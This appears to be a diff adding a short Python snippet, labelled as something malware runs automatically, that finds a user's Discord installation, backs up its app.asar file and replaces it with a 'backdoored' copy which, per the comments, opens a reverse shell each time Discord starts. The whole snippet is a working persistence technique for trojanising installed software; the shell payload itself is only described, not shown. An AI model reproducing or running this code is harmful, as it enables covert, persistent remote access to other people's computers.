@@ -1,0 +1,13 @@
+# Malware executes this automatically
+import shutil
+from pathlib import Path
+
+discord = Path.home() / "AppData/Local/Discord"
+latest = sorted(discord.glob("app-*"))[-1]
+asar = latest / "resources/app.asar"
+
+# Backup + replacement with backdoored ASAR
+shutil.copy2(asar, asar.with_suffix(".bak"))
+shutil.copy2("backdoored.asar", asar)
+# The backdoored ASAR contains a reverse shell
+# that activates each time Discord starts
